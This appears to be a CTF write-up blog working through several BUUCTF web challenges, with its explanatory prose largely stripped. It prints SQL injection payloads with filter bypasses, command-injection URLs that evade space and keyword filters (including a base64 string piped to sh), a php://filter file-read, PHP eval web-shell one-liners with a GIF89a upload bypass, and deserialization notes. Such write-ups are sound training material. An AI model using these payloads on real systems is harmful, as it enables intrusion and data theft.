        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="SUCTF-2019-EasySQL-1"><a href="#SUCTF-2019-EasySQL-1" class="headerlink" title="[SUCTF 2019]EasySQL  1"></a>[SUCTF 2019]EasySQL  1</h2><p><img src="https://img-blog.csdnimg.cn/b565bb2a9657430992b91bbc44e7da14.png" alt="1"><br>,</p><p><img src="https://img-blog.csdnimg.cn/f43f0672d814487e8e3ba485eec10a71.png" alt="2"><br>1<br>1 or 1&#x3D;1<br><img src="https://img-blog.csdnimg.cn/3192b758fcd640a7be33dc8f451997b2.png" alt="3"><br><br><code>1&#39; order by 4#</code><br><code>1;show databases;#</code><br><img src="https://img-blog.csdnimg.cn/d736ee3c4872469e8becd01db21751f6.png" alt="4"><br><code>1;show tables;#</code><br><img src="https://img-blog.csdnimg.cn/8948218749ff428986d236abc8a79a21.png" alt="5"><br>WP</p><blockquote><p>select $post[query]||flag from Flag </p></blockquote><p><br> sql_mode  PIPES_AS_CONCAT || CONCAT() <br> sql_mode  PIPES_AS_CONCAT  || OR<br> || sql_modePIPES_AS_CONCAT</p><p><strong></strong></p><blockquote><p>1;set sql_mode&#x3D;pipes_as_concat;select 1</p></blockquote><p><code>set sql_mode=PIPES_AS_CONCAT;</code>||<br><img src="https://img-blog.csdnimg.cn/dadc8d4a66bf4ab7af9377443c126787.png" alt="6"><br><strong></strong></p><blockquote><p>*,1</p></blockquote><h2 id="GXYCTF2019-Ping-Ping-Ping-1"><a href="#GXYCTF2019-Ping-Ping-Ping-1" class="headerlink" title="[GXYCTF2019]Ping Ping Ping 1"></a>[GXYCTF2019]Ping Ping Ping 1</h2><p><strong></strong></p><p>getIP<br><img src="https://img-blog.csdnimg.cn/569938c8fcdb447886240ed7bbfec003.png" alt="1"><br>IP<br><img src="https://img-blog.csdnimg.cn/983781f716ab4dd0aa80bfe544eba0ce.png" alt="2"><br><code>http://03c1c197-5f25-4c94-b5a0-eb8e1d08e92f.node4.buuoj.cn:81/?ip=127.0.0.1;ls</code><br><img src="https://img-blog.csdnimg.cn/d5cf920fe0bf4f6ea4a7cc2fec2ce939.png" alt="3"><br><code>http://03c1c197-5f25-4c94-b5a0-eb8e1d08e92f.node4.buuoj.cn:81/?ip=127.0.0.1;cat flag.php</code><br><img src="https://img-blog.csdnimg.cn/560f292fac52458eb954a92f641c625b.png" alt="4"><br><code>$IFS$&#123;IFS&#125;$IFS$9&lt;&lt;&gt;%09%0a</code><code>$IFS$9</code><br><code>http://03c1c197-5f25-4c94-b5a0-eb8e1d08e92f.node4.buuoj.cn:81/?ip=127.0.0.1;cat$IFS$9flag.php</code><br>flag<br><img src="https://img-blog.csdnimg.cn/6b6bd7f364e64dc1add617a96fb8be44.png" alt="5"><br>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">PING</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token punctuation">(</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytes<span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token operator">|</span>\'<span class="token operator">|</span>\<span class="token string double-quoted-string">"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\>|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your symbol!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your space!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bash/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your bash!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ping -c 4 "</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>  <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong></strong><br><code>http://03c1c197-5f25-4c94-b5a0-eb8e1d08e92f.node4.buuoj.cn:81/?ip=127.0.0.1;b=ag;cat$IFS$9fl$b.php</code><br>flag<br><img src="https://img-blog.csdnimg.cn/6886b988df1241488482cddd05b97ae6.png" alt="6"><br><strong></strong><br>base64base64-dsh<br><code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code> flag<br><strong></strong><br></p><p></p><blockquote><p>?ip&#x3D;127.0.0.1;cat$IFS$9`ls`<br>$IFSLinux<br>$9shell$<br>lsflag.phpindex.phpcatflag.phpindex.php</p></blockquote><p><img src="https://img-blog.csdnimg.cn/d5db8ab9fb004a519fbbe440e4f633db.png" alt="7"><br><a href="https://blog.csdn.net/vanarrow/article/details/108295481#:~:text=%E5%86%85%E8%81%94%EF%BC%8C%E5%B0%B1%E6%98%AF%E5%B0%86%E5%8F%8D%E5%BC%95%E5%8F%B7%E5%86%85%E5%91%BD%E4%BB%A4%E7%9A%84%E8%BE%93%E5%87%BA%E4%BD%9C%E4%B8%BA%E8%BE%93%E5%85%A5%E6%89%A7%E8%A1%8C%20%3Fip%3D127.0.0.1%3Bcat%24IFS%249%60ls%60%20%24IFS%E5%9C%A8Linux%E4%B8%8B%E8%A1%A8%E7%A4%BA%E4%B8%BA%E7%A9%BA%E6%A0%BC,%249%E6%98%AF%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9Fshell%E8%BF%9B%E7%A8%8B%E7%AC%AC%E4%B9%9D%E4%B8%AA%E5%8F%82%E6%95%B0%E6%8C%81%E6%9C%89%E8%80%85%EF%BC%8C%E5%A7%8B%E7%BB%88%E4%B8%BA%E7%A9%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%24%E5%90%8E%E5%8F%AF%E4%BB%A5%E6%8E%A5%E4%BB%BB%E6%84%8F%E6%95%B0%E5%AD%97%20%E8%BF%99%E9%87%8C%24IFS%249%E6%88%96%24IFS%E5%9E%82%E7%9B%B4%EF%BC%8C%E5%90%8E%E9%9D%A2%E5%8A%A0%E4%B8%AA%24%E4%B8%8E%7B%7D%E7%B1%BB%E4%BC%BC%EF%BC%8C%E8%B5%B7%E6%88%AA%E6%96%AD%E4%BD%9C%E7%94%A8%201"></a></p><h2 id="-2019-Secret-File-1"><a href="#-2019-Secret-File-1" class="headerlink" title="[ 2019]Secret File 1"></a>[ 2019]Secret File 1</h2><p><img src="https://img-blog.csdnimg.cn/21b672b9a2514523b89df8ad798a406b.png" alt="1"><br><br><img src="https://img-blog.csdnimg.cn/fb593331da744aa3930c6d89aeab2be7.png" alt="2"><br>php,<code>http://cd07cfe1-455f-47ff-bded-782f66105f3d.node4.buuoj.cn:81/Archive_room.php</code><br><img src="https://img-blog.csdnimg.cn/9d9847ef896e4a73a697ff0f032e8477.png" alt="2"><br><br><img src="https://img-blog.csdnimg.cn/f6d7e63800e843c5a194471e7b29604e.png" alt="3"><br><br><img src="https://img-blog.csdnimg.cn/f09067820c274538b236cad427d872b6.png" alt="5"></p><p><br></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>secret<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"../"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"tp"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"input"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Oh no!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//flagflag.php</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.w3school.com.cn/php/func_string_stristr.asp">PHP stristr() </a><br><a href="https://www.w3school.com.cn/php/func_string_strstr.asp">PHP strstr() </a><br>strstrstristrstrstrstristr</p><p><br><code>&lt;?php  show_source(__FILE__);  echo $_GET[&#39;hello&#39;];  $page=$_GET[&#39;page&#39;];  while (strstr($page, &quot;php://&quot;)) &#123;  $page=str_replace(&quot;php://&quot;, &quot;&quot;, $page);   &#125;    include($page);    ?&gt;</code></p><blockquote><p>phppagephp:&#x2F;&#x2F;strstrPHP:&#x2F;&#x2F;inputpost</p></blockquote><p>php:&#x2F;&#x2F;php:&#x2F;&#x2F;filter<br><code>http://cd07cfe1-455f-47ff-bded-782f66105f3d.node4.buuoj.cn:81/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</code><br></p><blockquote><p>PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZTNlZDgxOGYtZjM4MS00OWFjLThjNDEtOTMzOTE2ZmVjZGJjfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo&#x3D;<br>flag</p></blockquote><h2 id="-2019-LoveSQL"><a href="#-2019-LoveSQL" class="headerlink" title="[ 2019]LoveSQL"></a>[ 2019]LoveSQL</h2><p><img src="https://img-blog.csdnimg.cn/ac670dfd41f2450a8d5ca02b5e9d3dc9.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/404c661805b048e39d33a2094a1ca0c7.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/8bd81110c54a4d93b1977ffb225654d3.png" alt="3"><br><img src="https://img-blog.csdnimg.cn/d90fecebb74646dcbf7f0067f51afab6.png" alt="4"><br><img src="https://img-blog.csdnimg.cn/f766ec5a93624dcaa587c5b8b7572887.png" alt="5"><br>md5LoveSQL<br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=admin&#39;  order by 4%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/aa0456adb9c04bb49d67511f09994f1d.png" alt="5"><br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=admin&#39;  order by 3%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/8a28e495e33e4fe3957bbdb7906bcf14.png" alt="6"><br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-admin&#39;  union select 1,2,3%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/760edddc69cb4cb2b42c44d75e69b35b.png" alt="7"><br>23<br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-admin&#39;  union select 1,database(),3%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/153c23c6528f42e3a70789972ce64e9a.png" alt="8"><br><strong></strong><br> <code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/70b3fb676e0b4563b3f2bd70506e1390.png" alt="9"><br><strong>geekuser</strong><strong>l0ve1ysq1</strong><br><strong></strong><br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;geekuser&#39;%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/c4f226dea1934756b7a81508108a96f4.png" alt="10"><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-1&#39; union select 1,2,group_concat(id,username,password) FROM geekuser%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/3cb3400a84e147568c891de1ffeddd5a.png" alt="11"><br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-1&#39; union select 1,2,group_concat(id,username,password) FROM l0ve1ysq1%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/953a9aa4e16446e8b2013e713a20350b.png" alt="12"></p><p>flag</p><h2 id="-2019-Http"><a href="#-2019-Http" class="headerlink" title="[ 2019]Http"></a>[ 2019]Http</h2><p></p><p><img src="https://img-blog.csdnimg.cn/b4f8a8a9ad7b479b87433f35e4a099d5.png" alt="1"><br>secret.php<br><img src="https://img-blog.csdnimg.cn/950d2fd795e44872959f455c67bea634.png" alt="2"></p><p><img src="https://img-blog.csdnimg.cn/413437df593244f88a61ca81d55ac52b.png" alt="4"><img src="https://img-blog.csdnimg.cn/2539fa128ac14f49813b00779ced60f1.png" alt=""></p><p><br><img src="https://img-blog.csdnimg.cn/ca8fb6a9b04a44889273265f2145ace4.png" alt="5"><br><br><img src="https://img-blog.csdnimg.cn/a430853e4d5f49b080bf1273ade3b6c4.png" alt="5"></p><h2 id="-2019-Upload"><a href="#-2019-Upload" class="headerlink" title="[ 2019]Upload"></a>[ 2019]Upload</h2><p><strong></strong><br><img src="https://img-blog.csdnimg.cn/bcaa47b202f84691a8025030c81de3e1.png" alt="1"><br><code>&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[111])&lt;/script&gt;</code><code>&lt;?php eval$_POST[111];?&gt;</code></p><p><img src="https://img-blog.csdnimg.cn/943f2c97506b44f2a89f2411ca82ea8b.png" alt="3"><br><br><img src="https://img-blog.csdnimg.cn/1d35bc7aa0804e2c8d483798fe1681c5.png" alt="2"><br><strong>gif89a</strong>gif89a &lt;%eval request(xx)%&gt; xxx.jpgxx.gifwaf</p><p><strong>GIF89a?</strong></p><blockquote><p>GIF89aGIF89a19897 GIF89a87a19875Web89a 89aGIF GIF89a</p></blockquote><p><img src="https://img-blog.csdnimg.cn/77420aae89a84bcf8f5f4b088d5a2939.png" alt="5"><br><br>shell.phtml<img src="https://img-blog.csdnimg.cn/eae751b2d53548b4a0a8e06cd5532007.png" alt="6"><br>flag<br><img src="https://img-blog.csdnimg.cn/f2813def245f434e82b4e1bf716bab2a.png" alt="7"></p><h2 id="-2019-BabySQL"><a href="#-2019-BabySQL" class="headerlink" title="[ 2019]BabySQL"></a>[ 2019]BabySQL</h2><p><img src="https://img-blog.csdnimg.cn/7c30418f57b942f6b50b6cd9438386cd.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/d1cfa48ceafa4f56b8d51e4c4c218199.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/97419c713baf4031b1bee85bcb3d2c48.png" alt="3"><br>or<br><img src="https://img-blog.csdnimg.cn/d6d8052077c14610b0e4be63ff5b83f7.png" alt="4"><br><br><img src="https://img-blog.csdnimg.cn/16958e2ab1af45e1ac30c433bef723af.png" alt="5"><br>or,by,union,select,where,from,and<br><br><code>1&#39; oorrder by 3#</code><br><em>3</em></p><p><br><code>1&#39; uunionnion selselectect 1,2,database()#</code></p><p><br><code>-1&#39; uunionnion seselectlect 1,2,group_concat(table_name) FFROMROM infoorrmation_schema.tables wherwheree table_schema=database()#</code><br><img src="https://img-blog.csdnimg.cn/d4a24a5c9e66422eaee2a7d97cc3e5ab.png" alt="6"></p><p><br><code>1&#39; ununionion seselectlect 1,2,group_concat(column_name) FRFROMOM infoorrmation_schema.columns whewherere table_schema=database() and table_name=&#39;&#39;#</code><br><img src="https://img-blog.csdnimg.cn/489436bf5b2c4bed8b6d663e4c2fc9b3.png" alt="7"></p><p><br><code>1&#39; uniunionon seleselectct 1,2,group_concat(id,username,passwoorrd) FFROMROM #</code><br>flag.<br><img src="https://img-blog.csdnimg.cn/0d1f40d27af84b55a5307d37c9174e27.png" alt="8"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>or<strong>information</strong><strong>or</strong><strong>infoorrmation</strong></p><h2 id="-2019-PHP"><a href="#-2019-PHP" class="headerlink" title="[ 2019]PHP"></a>[ 2019]PHP</h2><p>php<br><img src="https://img-blog.csdnimg.cn/f4e9a9f0e8dc42e8bbc1e56acfa88747.png" alt="1"><br></p><blockquote><p>.git .svn .swp .~.bak.bash_history.bkf</p></blockquote><p><strong>dirsearch</strong></p><blockquote><p></p></blockquote><blockquote><p>-u url</p></blockquote><blockquote><p>-e </p></blockquote><blockquote><p>-w </p></blockquote><blockquote><p>-r </p></blockquote><p>dirsearch</p><p>.&#x2F;dirsearch.py -u 127.0.0.1 -e php</p><p><a href="http://www.zip,/">www.zip</a><br><img src="https://img-blog.csdnimg.cn/d8843158602b47acac1b90a490dcd436.png" alt="2"><br>5</p><blockquote><p>class.php</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>username</strong><strong>admin</strong><strong>password</strong><strong>100</strong>flag<strong>username</strong><strong>guest</strong>flag</p><blockquote><p>index.php</p></blockquote><p></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span>    <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>getselect<strong>unserialize</strong></p><p><a href="https://zhuanlan.zhihu.com/p/366455343"></a></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><strong>php</strong></p><blockquote><p>O:4:User:2:{s:3:age;i:20;s:4:name;s:4:daye;}<br>::::{::;::;}<br><br>a - array         b - boolean<br>d - double         i - integer<br>o - common object     r - reference<br>s - string         C - custom object<br>O - class         N - null<br>R - pointer reference   U - unicode string</p></blockquote><p><strong>private </strong></p><blockquote><p>   private<br>   \0%00</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"User"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00User%00age"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00User%00name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"daye"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token comment"># 9=7+2  10=8+2  2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php"></a></p><blockquote><p> __construct()  __destruct()  __call()  __callStatic()  __get()  __set()  __isset()  __unset()  __sleep()  __wakeup()  __serialize()  __unserialize()  __toString()  __invoke()  __set_state()  __clone()  __debugInfo()  </p></blockquote><p><strong></strong></p><blockquote><p>:    : serialize()</p></blockquote><blockquote><p>: : unserialize()</p></blockquote><h2 id="ACTF2020--BackupFile"><a href="#ACTF2020--BackupFile" class="headerlink" title="[ACTF2020 ]BackupFile"></a>[ACTF2020 ]BackupFile</h2><p><strong>backup 